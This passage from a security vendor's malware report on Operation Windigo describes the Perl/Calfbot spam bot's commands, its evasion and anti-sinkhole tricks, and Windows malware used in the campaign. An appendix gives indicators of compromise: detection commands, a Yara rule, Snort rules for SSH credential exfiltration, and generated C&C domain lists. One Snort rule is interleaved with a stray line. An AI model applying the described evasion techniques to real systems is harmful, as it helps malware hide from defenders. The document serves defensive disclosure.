by Perl/Calfbot:\n\n\nTable 6.4 Commands implemented by Perl/Calfbot\n\n\nCommand Functionality\n\nSLEEP integer Sleeps for integer duration in seconds\n\nRELOAD url Updates itself from url\n\nKILL Stops the malware\n\nSEND marker A spam job. Spam template and target emails\nare given as parameters. marker is used to split\nthe incoming parameters.\n\nTESTSEND marker A test spam job. Spam template and target emails\nare given as parameters. marker is used to split\nthe incoming parameters.\n\nEXECUTE command Executes the given command without feedback to C&C\n\nSTART SENDMAIL Starts sendmail service\n\nSTOP IPTABLES Stops iptables service (Linux firewall)\n\nNote that if the command returned is not in the above list, Perl/Calfbot will send the command\nin the “unknown” URL parameter at its next GET request to the C&C server. This is most likely\na troubleshooting measure implemented by the authors to have more visibility when things don’t\nwork as expected.\n\n\nSide Story\nWe saw in our telemetry data that our Anti-Virus product caught an update of Perl/Calfbot.\nAfter a RELOAD command, the updated script was caught on disk and removed. Due to the lack\nof error handling in the code, we expect that the malware tried to start a non-existent script\nand terminated itself.\n\n\n##### 6.5. Internals\n\n###### 6.5.1. Deployment\n\nPerl/Calfbot is initially downloaded to “/tmp/ “ (yes, a filename set to a space) and executed\nfrom there before being deleted. Deleting a file that is under execution is perfectly legal under\nUnix-like kernels since the operating system tracks file handles using inodes and this inode will\nnot be unallocated until the process using it terminates. The Perl file is thus on the filesystem\nfor a very short period of time and in an odd location making post-infection discovery difficult.\n\nWhen launching Perl/Calfbot, the script changes its process name to /usr/bin/crond using Perl’s\n**$PROGRAM_NAME (aka $0) language construct in order to mimic the venerable job scheduler present**\non almost every Unix-like operating system on the planet.\n\nThe RELOAD command can be used to deploy an updated version of itself. The updated script\nis downloaded with the same filename as above but is not executed directly. To prevent more\nthan one from running concurrently with the original one, Perl/Calfbot always creates a lock\non a cunningly- named /tmp/... file using the flock system call and uses it as a mutex.\n\nSo, in order to properly update itself, Perl/Calfbot first releases this special lock, launches the new\nscript in the background using the nohup system command, removes all evidence of the update\nby deleting the nohup.out and the “/tmp/ “ files and gracefully exits.\n\nChecking for the presence of this lock is a reliable way to know if a server is infected and should rarely\ntrigger false positives as mentioned in the IOC section of the document.\n\n\n-----\n\n###### 6.5.2. No Dependencies\n\nThe first Perl/Calfbot version we analyzed showed very few dependencies on standard Perl\nmodules: it was relying solely on standard built-in modules. Subsequent versions analyzed went\neven further by copying the necessary code from the official Perl modules in order to remove even\nmore dependencies. This is pictured below with the encode_base64 function added\nin Perl/Calfbot version 39:\n\nOriginal **MIME::Base64encode_base64** [code](https://metacpan.org/source/GAAS/MIME-Base64-Perl-1.00/lib/MIME/Base64/Perl.pm%2523L14)\n\n\n**sub encode_base64 ($;$)**\n**{**\n**if ($] >= 5.006) {**\n**require bytes;**\n**if (bytes::length($_[0]) > length($_[0]) ||**\n**($] >= 5.008 && $_[0] =~ /[^\\0-\\xFF]/))**\n**{**\n**require Carp;**\n**Carp::croak(“The Base64 encoding is only defined for bytes”);**\n**}**\n\n**use integer;**\n\n**my $eol = $_[1];**\n**$eol = “\\n” unless defined $eol;**\n\n**my $res = pack(“u”, $_[0]);**\n**# Remove first character of each line, remove newlines**\n**$res =~ s/^.//mg;**\n**$res =~ s/\\n//g;**\n\n**$res =~ tr|` -_|AA-Za-z0-9+/|; # `# help emacs**\n**# fix padding at the end**\n**my $padding = (3 - length($_[0]) % 3) % 3;**\n**$res =~ s/.{$padding}$/’=’ x $padding/e if $padding;**\n**# break encoded string into lines of no more than 76 characters each**\n**if (length $eol) {**\n**$res =~ s/(.{1,76})/$1$eol/g;**\n**}**\n**return $res;**\n**}**\n\n\n-----\n\nObfuscated but tidy-fied malware code\n\n\n**sub ab5 ($;$)**\n**{**\n**if ( $] >= 5.006 )**\n**{**\n**require bytes;**\n**if ( bytes::length( $_[0] ) > length( $_[0] )**\n**|| ( $] >= 5.008 && $_[0] =~ /[^\\0-\\xFF]/ ) )**\n**{**\n**require Carp;**\n**Carp::croak(“The Base64 encoding is only defined for bytes”);**\n**}**\n**}**\n**use integer;**\n**my $d6ca = $_[1];**\n**$d6ca = “\\n” unless defined $d6ca;**\n**my $ibi7 = pack( “u”, $_[0] );**\n**$ibi7 =~ s/^.//mg;**\n**$ibi7 =~ s/\\n//g;**\n**$ibi7 =~ tr/\\` -_/AA-Za-z0-9+\\//;**\n**my $i7mn = ( 3 - length( $_[0] ) % 3 ) % 3;**\n**$ibi7 =~ s/.{$i7mn}$/’=’ x $i7mn/e if $i7mn;**\n**if ( length $d6ca ) { $ibi7 =~ s/(.{1,76})/$1$d6ca/g; }**\n**return $ibi7;**\n**}**\n\n\nIt’s quite obvious that it was copied from the original Base64 module. It is interesting to see how\ntheir obfuscation process works. Comments and empty lines are stripped and variables names\nand subs are substituted with random-looking strings. No control flow obfuscation or layers\nof indirection were introduced.\n\nBack on dependencies, we also noticed that in the changes introduced in version 40, the dependency\n[on the core CGI package was removed. We think this was done because of the tendency of Linux](http://www.nntp.perl.org/group/perl.perl5.porters/2012/01/msg182376.html)\n[distributors to strip the core Perl package including removing CGI. This care leads us to think](http://www.nntp.perl.org/group/perl.perl5.porters/2012/01/msg182376.html)\nthat these operators know what they are doing.\n\n\nSide Story\n\nA debugging subroutine is present in Perl/Calfbot code. It is unused in the builds we had access\nto but was present in all the versions. It indicates that their obfuscation process doesn’t prune\ndead code.\n\n**sub aan {**\n**print ‘ [‘. localtime(). ‘] ‘;**\n**print @_;**\n**}**\n\n\n###### 6.5.3. Reaching Command and Control Server\n\n[It uses a domain generation algorithm (DGA) to reach its Command and Control (C&C) server.](http://en.wikipedia.org/wiki/Domain_generation_algorithm)\nThe algorithm is highly configurable but in its current form it always generates the same 10 domains.\nThree hardcoded IP addresses are also inserted in this list as fallback mechanism in case\nall the domains become unavailable.\n\nPerl/Calfbot uses a clever trick to validate that the domain names provided by the DGA are really\nunder the operator’s control and not owned by a third party such as a security researcher trying\nto setup a sinkhole. Before attempting a connection to a given DGA domain, Perl/Calfbot first\ncompares the IP addresses of two of this domain’s subdomains: www and a random one.\nIf the IP address of www minus 1 equals the IP address of the random subdomain, then the DGA\ndomain is considered valid.\n\n\n-----\n\nFor example:\n\n\n**DGA domain: vqvsaergek.info**\n**www.vqvsaergek.info is 1.2.3.*4***\n**llmxglsiqr.vqvsaergek.info is 1.2.3.*5***\n\n\nSince www - 1 is equal to llmxglsiqr, then llmxglsiqr.vqvsaergek.info will be used as the C&C.\nIf this validation fails, then the same trick is attempted on the next domain provided by the DGA.\n\nWe think this was done to make the sinkholing of the C&C server harder. Without access to the perl\nscript itself to understand this validation process, a naive sinkhole attempt would merely register\nthe free domain and set its A record to the sinkhole IP address, leaving the researcher wondering\nwhy no connections are being made to the sinkhole.\n\nLastly, before accepting a given domain as the C&C, Perl/Calfbot will attempt a test communication.\nIt will send encrypted cryptographic information to the C&C in a GET request along with a &check=1\nand decrypt the server’s response. If the server returned SUCCESS then this domain is used\nby this Perl/Calfbot run for the next four hours.\n\n###### 6.5.4. C&C Communications\n\nThe communications with the C&C server are double-encrypted. First, they are encrypted using\nthe same XOR-based cipher found in Linux/Cdorked and Linux/Ebury. Then the communication\nis passed on over HTTPS with certificate verification turned off, making it invisible to casual traffic\nanalysis that could be routinely performed by system administrators.\n\n###### 6.5.5. Core Purpose: Sending Spam\n\nIn order to send spam, Perl/Calfbot will perform a series of tests to ensure that its host can send\nquality spam.\n\n - Local email sending configuration checks\n\n - Send test spam to Hotmail, Yahoo and Gmail\n\nFirst it will check if postfix is running and will prefer using it instead of any other mail submission\nagent (MSA) program. The malware is really meticulous in finding a proper MSA that will allow it\nto send emails. It will favor an executable named sendmail, mailx or mail in the system’s PATH\nenvironment variable. If not present, it will perform file names matching using locate and find\nand perform a variety of checks to ensure that this is a proper MSA.\n\nAdditionally, if the script runs with root privileges, it will attempt to start the mail transfer\nagent (MTA) if it is not already running. Only sendmail and postfix are supported. Furthermore,\nthe elevated privileges allow Perl/Calfbot to delete all traces of the sent emails from the system’s\nlog files.\n\n[The spam-sending engine is quite simple. The email is piped to the previously detected MSA one](http://en.wikipedia.org/wiki/Anonymous_pipe)\nby one for each destination email and is considered successfully sent if the pipe doesn’t return any\nerror, which in most Unix MSA’s doesn’t mean successful delivery. The spam template language\nsupports simple substitutions for fields such as name, email, count, a four character random string\nnamed rand and arbitrary parameters provided along with the email list. Interestingly, rand is used\nin prefix to the legitimately purchased domain names used by the operation in the emails. The rand\nis probably in there to thwart URL reputation systems. Lastly, the engine supports encoding the email’s\n[From and Subject headers with UTF-8 quoted-printable encoding to allow non-US characters](http://tools.ietf.org/html/rfc2045%23section-6.7)\nin those fields.\n\nIn the course of its normal operation, the C&C always sends a TESTSEND command before the real\nSEND. We were able to witness this behavior during our implementation of a fake client that simulates\nan infected server but that obviously doesn’t actually send any real spam messages. The template\nand destination list accompanying a TESTSEND command have distinctive characteristics compared\nto what is sent along with the SEND command. The template looks like the following:\n\n\n**Mail from: root@localhost**\n**Subject: Test mail <botid>**\n**Bla-bla-bla**\n**----------------**\n**best regards**\n\n\n-----\n\nThe destination emails are heavily re-used but change slightly over time. They are composed of a mix\nof email addresses from Yahoo, Hotmail and Gmail, along with some addresses associated with domains\ncontrolled by the Windigo operators.\n\nWe believe that these email accounts are all under the control of the operators and are used\nto validate that the compromised server is not blacklisted by any of these large email providers.\nThis enables stealthier operation since non-blacklisted servers won’t send ineffective spam and also\nprevents a reputation hit on the rest of the spam content sent since blacklisted IP addresses are more\noften monitored by anti-spam teams.\n\nWe also observed that our fake client would not receive any SEND jobs unless it actually delivered\nat least one of the spam message as instructed by the TESTSEND jobs.\n\nThe content and nature of the spam messages sent by Perl/Calfbot in the Windigo operation was\nalready described in the operation section of this document.\n\nAs soon as Perl/Calfbot is done processing a SEND job, it reports the statistics of successful and failed\nspam message deliveries to the C&C server. Usually, the server replies with a SLEEP 60, a TESTSEND\nand a SEND command.\n\n\nSide Story\nIn some email templates used by Perl/Calfbot, we observed interesting hard-coded paths, probably due\nto a misuse of the template generator:\n\n**L:\\temp\\ru_AM_NLtemplate_straight_013_sil_02 (1)\\**\n**C:\\Documents and Settings\\Administrator\\Desktop\\LaModa\\**\n\n\n-----\n\n### 7. WINDOWS MALWARE\n\nAs previously mentioned, the web visitors accessing pages hosted on websites infected with Linux/\nCdorked can be redirected to exploit kits. These exploit kits, if successful, install two different\nmalware families, depending on the visitor’s geographic location.\n\nVictims coming from USA, Canada, Australia and UK receive a malware family dubbed Win32/\nBoaxxe.G by ESET, whereas others countries will get a Win32/Glupteba.M sample. This section gives\nan overview of the functionality of both malware families.\n\n##### 7.1. Win32/Glupteba.M\n\nThe Win32/Glupteba.M malware family usually comes as an NSIS installer that writes a malicious file\nto disk, creates a service that runs the file and, finally, starts the newly created service:\n\n\nTable 7.1 Win32/Glupteba.M service and corresponding file\n\n\nFilename on disk **C:\\Documents and Settings\\LocalService\\Local Settings\\**\n**Application Data\\NVIDIA Corporation\\Update\\nvupd32.exe**\n\nService name NVIDIA Update Server\n\nThe first thing the malware does when started is to try to contact its C&C server via HTTP. To do so,\nit randomly selects an IP address and a port from a hardcoded list of 100 entries and makes an HTTP\nGET request on the /stat path. It is worth mentioning that some IP addresses in the list belong\nto legitimate organizations, in order to fool automatic blocking attempts by security vendors.\nIf the malware does not receive the expected information from a server, it simply picks a new one\nfrom its list. Earlier versions of Win32/Glupteba.M used a list of domain names, contacted on port\n8000 instead of hardcoded IP addresses.\n\nThe GET request is sent without any of the regular HTTP headers. Its path contains various parameters,\nas shown in the following image describing the network interaction of a host infected with Win32/\nGlupteba.M and its C&C.\n\nFigure 7.1 Win32/Glupteba.M first contact with its C&C\n\nThe most important parameters are a unique identifier for the malware installation, the version\nof the malware and a hardcoded password (bpass). The C&C server’s response is a session\nparameter associated to a port number, which the bot will then connect to.\n\nOnce connected to this port, the infected machine receives the command HELLO, then it sends a pair\ncomposed of its unique identifier and the previously mentioned hardcoded password. At this point\nthe server will send a command to the machine every 30 seconds, as shown in the following figure:\n\nFigure 7.2 Interaction between the bot and its C&C\n\n\n-----\n\nThe server commands have the following format:\n\n\n**0x00 BYTE Command**\n**0x01 WORD Connection index**\n**0x03 WORD Content size**\n**0x05 BYTE[n] Content (n is content_size)**\n\n\nThe table below shows the actual list of commands the bot accepts:\n\n\nTable 7.2 List of Commands the Bot Accepts\n\n\nCommand Description Functionality\n\nc create proxy connection to a remote host\n\ns get previously created proxy connection info\n\nw close proxy connection socket\n\nP set value (version string) in registry\n\nR set svalue (encrypted C&C list) in registry\n\n3 download from URL and execute\n\ne no operation\n\nIn the interaction shown in the previous screenshot, the bot is instructed to establish a proxy connection\nwith a remote host. In all instances we investigated, the bots are used as proxies to send spam.\nBut before any email is sent, two tests are performed by the proxy endpoint: first it makes a GET\nrequest on http://www.google.com/robots.txt, and then it sends another GET request\non TCP port 25 – usually used for SMTP – on a server infected by Linux/Ebury. If these tests are successful,\nmeaning the proper network connectivity is present, the bot is used as a proxy to send spam messages.\n\nIt is interesting to see that only hosts which have outbound TCP/25 internet access are considered\nby Win32/Glupteba, showing that a non-negligible number of end user workstations are connected\nby ISPs who choose to ignore the good practice of blocking this traffic. It may even explain why Windigo\noperators prefer installing Win32/Boaxxe.G on workstations located in countries where ISPs have\na wider adoption of blocking outbound TCP/25 traffic.\n\nFinally, we believe Win32/Glupteba.M is deeply related to the Windigo operation because:\n\n - All the C&C servers used by this malware family are also infected with Linux/Ebury\n\n - The spam messages sent by Win32/Glupteba.M are similar to the ones sent by Perl/Calfbot\n\n##### 7.2. Win32/Boaxxe.G\n\n[Win32/Boaxxe is an old malware family – first mentioned on the Internet around 2010 – whose](http://www.virusradar.com/en/Win32_Boaxxe/detail)\n[purpose is to redirect users to advertisement websites thanks to various click fraud techniques,](http://en.wikipedia.org/wiki/Click_fraud)\nand thus earn money from these websites as an “advertiser”. We thoroughly described one particular\n[Win32/Boaxxe variant named Win32/Boaxxe.BE in two recent blog posts, both from a technical](http://www.welivesecurity.com/2014/01/17/boaxxe-adware-a-good-advert-sells-the-product-without-drawing-attention-to-itself-part-2/)\n[and a social point-of-view, and we will here simply give a brief comparison between the two variants.](http://www.welivesecurity.com/2014/01/14/boaxxe-adware-a-good-ad-sells-the-product-without-drawing-attention-to-itself-pt-1/)\n\n###### 7.2.1. Code Comparison\n\nThe installation process of these two variants differs significantly. Whereas Win32/Boaxxe.G\ncomes as a NSIS installer that simply executes the unique export of a randomly named DLL to infect\n[the machine, Win32/Boaxxe.BE follows a multi-step installation process. In particular the BE variant](http://www.welivesecurity.com/2014/01/17/boaxxe-adware-a-good-advert-sells-the-product-without-drawing-attention-to-itself-part-2/)\ndeploys both a Firefox and a Chrome extension, which will serve to redirect the user to advertisement\nwebsites (Internet Explorer is controlled with memory hooks in both variants).\n\nRather than relying on browser extensions, Win32/Boaxxe.G installs several memory hooks into\nChrome/Firefox to realize similar actions. Since these memory hooks are highly browser- and versiondependent, the reliability of this method is far from perfect. In particular, it does not support Firefox\nand Chrome current versions at the time of writing (respectively numbered 27 and 32). It is worth\nmentioning that the actual redirection logic is implemented into some extension-like Javascript code,\nwhich will be decrypted on-demand when the memory hooks catch a relevant event such as the user\nbrowsing to a search engine.\n\n\n-----\n\nDespite this strong difference, both Win32/Boaxxe’s variants share almost the same payload code.\nThe distinction between the “hook mode” and the “browser extensions mode” relies on a hardcoded\nvalue contained in the binary, which therefore seems to play the role of a version number. We thus\ntend to believe that Win32/Boaxxe.G is an older version of Win32/Boaxxe.BE, with limited support\nfor recent browsers.\n\n###### 7.2.2. Advertisement Networks Comparison\n\nBoth Win32/Boaxxe.G and Win32/Boaxxe.BE redirect users to advertisements through long redirection\nchains composed of various advertisement websites, each of these websites paying the previous\none for the driven traffic. We observed that the doorway search engines – the advertisement networks\nentry-points – are different between the two Win32/Boaxxe variants, and moreover we were unable\nto find the same affiliate IDs in the redirection chain URLs. Consequently, we believe both variants\ndo not share the same advertisement networks, which likely means their operators are different.\n\nFinally, it should be mentioned that – contrary to Win32/Glupteba.M’s case – we did not find any\nrelationship between Win32/Boaxxe.G’s infrastructure and the rest of Windigo operation. In other\nwords, Windigo operators are likely being paid by another group to install Win32/Boaxxe.G\non English-speaking users’ computers.\n\n\n-----\n\n### 8. CONCLUSION\n\nThe Windigo operation is a large-scale effort that currently involves more than ten thousand\ninfected servers worldwide. The purpose of the operation seems to be monetary profit. This profit\nis gathered through various ways including redirecting web users to malicious content and sending\nunsolicited emails.\n\nIn this report, we have outlined the three main components of the Windigo operation: an OpenSSH\nbackdoor, a web redirection module and a spam-sending program. We have explained why we think\nthese components are related and how they have been used over the last two years to redirect\nmillions of Internet users and send even more spam. The scale of the operation is only matched\nby its sophistication and complexity.\n\nWhen reading this report, one could wonder why ESET, a security company focused mainly\non the desktop market, would invest time and energy understanding and documenting complex\nLinux threats. The first reason is that by gathering intelligence on compromised servers and how\nthey are used by malicious actors, we can better protect our users. Keeping track of web redirections\nand the landing pages for malicious content allowed us to protect hundreds of thousands of our\nusers from accessing malicious content. Proactively downloading and analyzing spam templates\nalso guaranteed proper labeling of spam messages before they even reached our clients.\n\nUnderstanding emerging threats on alternative operating systems that are usually less targeted\nby malware also allows us to better direct our detection mechanisms for these platforms.\n\nOur objective for producing this report is to help the general public, the researcher community\nand system administrators understand that the game has changed regarding the management of servers\non the Internet. Password-based login to servers should be a thing of the past. One should seriously\nconsider two-factor authentication or, at least, a safe use of SSH keys like described in the prevention\nappendix. The impact of the Windigo operation would have been reduced with these in place.\n\nFinally, by providing indicators of compromise and instructions on how to clean servers, we hope\nmore system administrators will quickly clean their systems and hosting providers will be more\nproactive in the notification to their customers, thus reducing the resources available\nto the malicious gang behind Operation Windigo.\n\nAcknowledgements\nWe would like to thank the following organizations or individuals for their collaboration during\nour research into Operation Windigo:\n\n - [Catherine Goerner-Potvin (artwork)](http://www.cathgoerner.com)\n\n - [The European Organization for Nuclear Research (CERN)](https://www.cern.ch)\n\n - [CERT‑Bund](https://www.bsi.bund.de/EN/Topics/IT-Crisis-Management/Cert-Bund/cert-bund_node.html)\n\n - [Emerging Threats](http://www.emergingthreats.net/)\n\n - [Sucuri](http://sucuri.net/)\n\n - [The Swedish National Infrastructure for Computing](http://www.snic.vr.se/)\n\n - Valérie Motard (artwork adaptation)\n\nOn behalf of the Ebury Working Group, we would also like to thank the following organizations\nfor their contributions:\n\n - [abuse.ch](http://www.abuse.ch/)\n\n - [Spamhaus](http://www.spamhaus.org/)\n\n - [Maven Hosting](http://www.mavenhosting.com/)\n\n - [PlusServer AG](http://www.plusserver.de/)\n\n\n-----\n\n### APPENDIX 1: INDICATORS OF COMPROMISE (IOC)\n\nIn this section we will highlight various technical indicators in order to be able to identify\ninfected systems. We divided the indicators in two categories in order to appeal to both system\nadministrators and large hosting providers: namely host-based IOCs and network-based IOCs.\n\nCAUTION As soon as this information is public the malware authors will most likely update\ntheir technique and tools to evade detection and thwart analysis as they have done\nin the past. Consequently, be aware that any of the advice we give to identify\nor clean oneself might already be outdated.\n\nWARNING These come with no warranties. They might not detect an infection and/or trigger\nfalse positives. Apply judgment.\n\nIf you find false-positives, have improved IOCs or find samples that do not match these IOCs please\n[let us know: windigo@eset.sk.](mailto:windigo%40eset.sk?subject=)\n\n[Updated IOCs will be available on our github page: https://github.com/eset/malware-ioc](https://github.com/eset/malware-ioc)\n\n##### A.1.1. Host-based Indicators\n\n###### A.1.1.1. Linux/Ebury\n\nWe will provide two means of identifying the presence of the OpenSSH backdoor. A quick one that relies\non the presence of a feature added by the malware to the ssh binary and a longer one which requires\ninspection of the shared memory segments used by the malware.\n\nTo Quickly Identify\nThe command ssh -G has a different behavior on a system with Linux/Ebury.A clean server will print\n\n\n**ssh: illegal option -- G**\n\n\nto stderr but an infected server will only print the usage. One can use the following command\nto determine if the server he is on is compromised:\n\n\n**$ ssh -G 2>&1 | grep -e illegal -e unknown > /dev/null && echo**\n**“System clean” || echo “System infected”**\n\n\nShared Memory Inspection\nLinux/Ebury relies on POSIX shared memory segments (SHMs) for interprocess communications.\nCurrently, it uses large segments of over 3 megabytes of memory with broad permissions like 666\n(which means readable and writable by everyone).\n\nCAUTION Other processes could legitimately create shared memory segments with broad\npermissions. Make sure to validate that sshd is the process that created\nthe segment like we show below.\n\nIdentify large shared memory segment with broad permissions by running the following as root:\n\n\n**# ipcs -m**\n**------ Shared Memory Segments --------**\n**key** **shmid** **owner** **perms** **bytes** **nattch**\n**0x00000000** **0** **root** **644** **80** **2**\n**0x00000000** **32769** **root** **644** **16384** **2**\n**0x00000000** **65538** **root** **644** **280** **2**\n**0x000010e0** **465272836** **root** **666** **3282312** **0**\n\n\n-----\n\nThen to look for the process that created the shared memory segment, use:\n\n\n**# ipcs -m -p**\n**------ Shared Memory Creator/Last-op PIDs --------**\n**shmid** **owner** **cpid** **lpid**\n**0** **root** **4162** **4183**\n**32769** **root** **4162** **4183**\n**65538** **root** **4162** **4183**\n**465272836** **root** **15029** **17377**\n\n\nIf the process matches sshd:\n\n\n**# ps aux | grep <pid>**\n**root 11531 0.0 0.0 103284 828 pts/0 S+ 16:40 0:00 grep 15029**\n**root 15029 0.0 0.0 66300 1204 ? Ss Jan26 0:00 /usr/sbin/sshd**\n\n\nAn sshd process using shared memory segments larger than 3 megabytes (3145728 bytes)\nand with broad permissions (666) is a strong indicator of compromise.\n\n###### A.1.1.2. Linux/Cdorked\n\nThere are a few ways one can use to detect if a server is infected with Linux/Cdorked. A simple way\nis to leverage a specific behavior of the backdoor that redirects any requests to /favicon.iso to Google.\n\nRunning this simple curl command:\n\n\n**$ curl -i http://myserver/favicon.iso | grep “Location:”**\n\n\nWill result in the following output on an infected server:\n\n\n**Location: http://google.com/**\n\n\nA clean site will return nothing on this particular command or a different Location header depending\non configuration. Further inspection can be done by removing the grep portion of the command:\n**curl-i http://myserver/favicon.iso.**\n\nAdditionally, one can look at the shared memory segments like for the Linux/Ebury case except\nthat the process creator of the shared memory will be apache (httpd), nginx or lighttpd. On newer\nvariants of Linux/Cdorked note that the permissions are more strict than before (600 instead\nof the previous 666).\n\nBe careful when looking for shared memory segments since they could be normal depending\non your setup. For example we know that suPHP uses shared memory.\n\n###### A.1.1.3. Linux/Onimiki\n\n[We only found this malware present on systems with a currently active BIND server already serving](https://www.isc.org/downloads/bind/)\nlegitimate DNS requests. Little evidence of this malware is left on the system besides the modified\nbinary executable.\n\n\n-----\n\n[Using the following Yara rule on a named binary:](http://plusvic.github.io/yara/)\n\n\n**rule onimiki**\n**{**\n**meta:**\n**description = “Linux/Onimiki malicious DNS server”**\n**malware = “Linux/Onimiki”**\n**operation = “Windigo”**\n**author = “Olivier Bilodeau <bilodeau@eset.com>”**\n**created = “2014-02-06”**\n**reference = “http://www.welivesecurity.com/wp-content/**\n**uploads/2014/03/operation_windigo.pdf”**\n\n**strings:**\n**// code from offset: 0x46CBCD**\n**$a1 = {43 0F B6 74 2A 0E 43 0F B6 0C 2A 8D 7C 3D 00 8D}**\n**$a2 = {74 35 00 8D 4C 0D 00 89 F8 41 F7 E3 89 F8 29 D0}**\n**$a3 = {D1 E8 01 C2 89 F0 C1 EA 04 44 8D 0C 92 46 8D 0C}**\n**$a4 = {8A 41 F7 E3 89 F0 44 29 CF 29 D0 D1 E8 01 C2 89}**\n**$a5 = {C8 C1 EA 04 44 8D 04 92 46 8D 04 82 41 F7 E3 89}**\n**$a6 = {C8 44 29 C6 29 D0 D1 E8 01 C2 C1 EA 04 8D 04 92}**\n**$a7 = {8D 04 82 29 C1 42 0F B6 04 21 42 88 84 14 C0 01}**\n**$a8 = {00 00 42 0F B6 04 27 43 88 04 32 42 0F B6 04 26}**\n**$a9 = {42 88 84 14 A0 01 00 00 49 83 C2 01 49 83 FA 07}**\n\n**condition:**\n**all of them**\n**}**\n\n\nwith:\n\n\n**$ yara windigo-onimiki.yar /usr/sbin/named**\n\n\nyields no output if one is not infected and would print a filename if one is.\n\n###### A.1.1.4. Perl/Calfbot\n\nThe presence of a /tmp/... file reveals if a server is infected and the file creation timestamp\nwill accurately reflect the infection time. However if the server is rebooted or the C&C server sends\na KILL command, the file will still be present but the malware will not be running anymore.\nIn order to confirm an active infection, one must test the presence of a lock on /tmp/... using\nthe following command:\n\n\n**flock --nb /tmp/... echo “System clean” || echo “System infected”**\n\n\nIf one is infected, lsof can be used to see what process owns that lock:\n\n\n**lsof /tmp/...**\n\n\nThe following can also validate that the targets of the /proc/$pid/exe symbolic links are the real crond:\n\n\n**pgrep -x “crond” | xargs -I ‘{}’ ls -la “/proc/{}/exe”**\n\n\nAnything looking like “/tmp/ “ (with a space) in the output is very suspicious.\n\n**pgrep requires the procps package. Replace pgrep -x crond with ps -ef | grep crond |**\n**grep -v grep | awk ‘{print $2}’ if you can’t install pgrep.**\n\n\n-----\n\n##### A.1.2. Network-based Indicators\n\n[We are providing simple snort rules in order to easily pinpoint malicious activity in large networks.](http://snort.org/)\nThe Internet being a wild place these have greater chances of triggering false positives. Use wisely.\n\n###### A.1.2.1. Linux/Ebury\n\nThis first rule matches against the SSH Client Protocol field that the backdoor uses to connect\nto a victim. Any external host trying to connect to the backdoor on properly identified SSH ports\nwill trigger the alert.\n\nThe second rule matches SSH credentials leaking out of the network. Any internal host sending\nDNS exfiltration packets will trigger the alert.\n\nOne can also manually inspect a server for outgoing DNS requests to DGA domains by using tcpdump\nbut carefully avoiding setting promiscuous mode since the malware pays attention to that.\nThis can be done with the following:\n\n\n**alert tcp any any -> any $SSH_PORTS (msg:”Linux/Ebury SSH backdoor activity”;**\n\n**$ tcpdump -p**\n\n**content:”SSH-2.0-”; depth:8; isdataat:22,relative; pcre:”/^[0-9a-f]{22,46}/R”;**\n**reference:url,http://www.welivesecurity.com/wpcontent/uploads/2014/03/**\n**operation_windigo.pdf; reference:url,https://github.com/eset/malware-ioc;**\n**classtype:trojan-activity; sid:1000001; rev:3;)**\n**# The following Snort rule for detecting Linux/Ebury infected machines**\n**# sending harvested credentials to a dropzone server has been provided by**\n**# CERT-Bund**\n**alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:”Linux/Ebury SSH backdoor data**\n**exfiltration”; content:”|12 0b 01 00 00 01|”; depth:6; pcre:”/^\\x12\\x0b\\x01\\**\n**x00\\x00\\x01[\\x00]{6}.[af0-9]{6,}(([\\x01|\\x02|\\x03]\\d{1,3}){4}|\\x03::1)\\x00\\x00\\**\n**x01Bs”; reference:url,http://www.welivesecurity.com/wp-content/uploads/2014/03/**\n**operation_windigo.pdf; reference:url,https://github.com/eset/malware-ioc;**\n**reference:url,https://www.cert-bund.de/ebury-faq; classtype:trojan-activity;**\n**sid:1000002; rev:1;)**\n\n\n-----\n\nBelow is the list of domains generated by the DGA for each seed by DGA generation.\n\n\nTable A.1.1 First generation DGA\n\n\nSeed Domain\n\n1 k2l8z1yeodm.info\n\n2 o5o8c1berdn.net\n\n3 mag8u1tejdt.biz\n\n4 a1t9y1xendd.info\n\n5 map9u1tejdt.net\n\n6 o5tac1berdn.biz\n\n7 k2zbz1yeodm.info\n\n8 seed domain\n\n9 a1hcy1xendd.net\n\n10 k2rdz1yeodm.biz\n\n11 o5dec1berdn.info\n\n12 maefu1tejdt.net\n\n13 a1z1h2xendd.biz\n\n14 mae2d2tejdt.info\n\n15 o5e4l2berdn.net\n\n16 k2t6i2yeodm.biz\n\n17 a1k8h2xendd.info\n\n18 k2qai2yeodm.net\n\n19 o5lcl2berdn.biz\n\n... maved2tejdt.info\n\n\nSeed Domain\n\n5010 q5ncv0dekcm8a1p.biz\n\n5011 oaxey7m0lde8s1v.info\n\n5012 c1b1jfi2pdi8w1f.net\n\n5013 oap3p6f5lde8s1v.biz\n\n5014 q5y6vdf7tdm8a1p.info\n\n5015 m2w9c4qaqdj8x1o.net\n\n5016 c1jczbhcpdi8w1f.biz\n\n5017 m2lfk2jfqdj8x1o.info\n\n5018 q5o2uad1cem8a1p.net\n\n5019 oah5w1w4uee8s1v.biz\n\n5020 c1v9l8s6yei8w1f.info\n\n5021 oafcffg8uee8s1v.net\n\n5022 q5w0g7cbcem8a1p.biz\n\n5023 m2d4berdzej8x1o.info\n\n5024 c1m8k5q0hfi8w1f.net\n\n5025 m2kcjcj2ifj8x1o.biz\n\n5026 q5w0f4n5lfm8a1p.info\n\n5027 oay4vbx7dfe8s1v.net\n\n5028 c1v9j2pahfi8w1f.biz\n\n\nTable A.1.2 Second generation DGA\n\n\nSeed Domain\n\n1 o8rad5ccx9f3r.net\n\n2 zbqaf5zcv9s3x.biz\n\n3 c0dbq5vcj9o3e.info\n\n4 x7sbu5hcg9b3f.net\n\n5 h0nct5rca9y3f.biz\n\n6 ubjcl5ucn9g3m.info\n\n7 f8wda5yck9i3h.net\n\n8 m7lea5yck9i3l.biz\n\n9 b8dfs5ecw9p3o.info\n\n10 abo0u6ach9k3w.net\n\n\n-----\n\n###### A.1.2.2. Linux/Cdorked\n\nThis rule matches the configuration commands that are sent to Linux/Cdorked. Any external host\ncontacting properly identified Web servers on HTTP ports with Linux/Cdorked’s specific cookie\nand URL will trigger the alert.\n\n\n**alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:”Linux/**\n**Cdorked is being configured by C&C”; flow:established,to_server;**\n**content:”POST”; content:”SECID=”; http_cookie; pcre:”/\\?[0-9a-f]**\n**{6} HTTP/”; reference:url,http://www.welivesecurity.com/wp-content/**\n**uploads/2014/03/operation_windigo.pdf; reference:url,https://**\n**github.com/eset/malware-ioc; classtype:trojan-activity; sid:1000003;**\n**rev:2;)**\n\n\n[Some additional rules for earlier versions of Linux/Cdorked are available from Emerging Threats.](https://lists.emergingthreats.net/pipermail/emerging-sigs/2013-April/021825.html)\n\n###### A.1.2.3. Linux/Onimiki\n\nLinux/Onimiki is a DNS server backdoor. Any 